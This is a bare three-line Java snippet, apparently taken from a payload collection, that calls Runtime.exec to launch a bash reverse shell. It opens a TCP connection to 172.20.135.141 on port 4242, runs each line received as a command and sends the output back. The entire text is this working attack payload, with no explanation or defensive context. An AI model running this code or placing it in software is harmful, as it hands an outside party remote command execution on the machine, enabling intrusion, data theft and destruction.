Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/172.20.135.141/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();